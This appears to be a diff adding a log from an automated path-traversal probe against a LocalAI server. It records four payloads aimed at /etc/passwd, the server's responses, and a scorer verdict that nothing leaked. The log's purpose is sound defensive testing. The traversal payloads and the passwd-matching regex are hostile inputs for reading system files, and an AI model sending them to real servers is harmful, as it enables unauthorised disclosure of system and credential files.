@@ -1,0 +1,32 @@
+# D5.2 - REAL path-traversal probe
+# timestamp_utc: 2026-05-31T22:23:41Z
+# framework: localai  kind: post_body  port: 8080
+# leak validation regex: root:.*:0:0:
+
+### payload: ../../../../etc/passwd
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; media-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' ws: wss: https:; frame-src 'self' blob:; worker-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'
+Content-Type: application/json
+Referrer-Policy: strict-origin-when-cross-origin
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Date: Sun, 31 May 2026 22:23:41 GMT
+Content-Length: 130
+
+{"uuid":"612a73cf-5d3f-11f1-a731-4e7a68c020e3","status":"http://127.0.0.1:8080/models/jobs/612a73cf-5d3f-11f1-a731-4e7a68c020e3"}
+
+
+### payload: ..%2f..%2f..%2f..%2fetc%2fpasswd
+curl: (28) Operation timed out after 8002 milliseconds with 0 bytes received
+
+
+### payload: ....//....//....//etc/passwd
+curl: (28) Operation timed out after 8002 milliseconds with 0 bytes received
+
+
+### payload: /etc/passwd
+curl: (28) Operation timed out after 8002 milliseconds with 0 bytes received
+
+
+# RESULT: TRAVERSAL_ATTEMPTED_NO_LEAK (scorer -> SECURE: rejected/sanitized)
